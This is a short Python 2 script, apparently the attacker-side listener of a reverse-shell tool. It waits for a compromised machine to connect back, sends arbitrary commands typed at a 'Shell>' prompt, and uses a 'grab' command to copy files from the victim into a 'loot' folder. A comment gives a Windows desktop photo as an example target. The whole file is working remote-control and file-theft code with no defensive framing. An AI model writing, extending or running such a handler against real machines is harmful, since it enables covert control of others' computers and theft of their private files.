import socket
import os

# INLINE TRANSFER

server_ip = '127.0.0.1'
server_port = 8080

def transfer(conn, command):
    conn.send(command)
    fi = open('/home/user/loot/test.png','wb')
    while True:
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed '
            fi.close()
            break
        fi.write(bits)

def connect():
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.bind((server_ip, server_port))
    so.listen(1)
    print '[+] Listening for incoming connections...'
    conn, addr = so.accept()
    print '[+] We got a connection from: ', addr

    while True:
        command = raw_input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        #grab is the command ;)
        #grab*C:\Users\user\Desktop\photo.jpeg
        elif 'grab' in command:
            transfer(conn, command)
        else:
            conn.send(command)
            print conn.recv(1024)
def main():
    connect()
main()
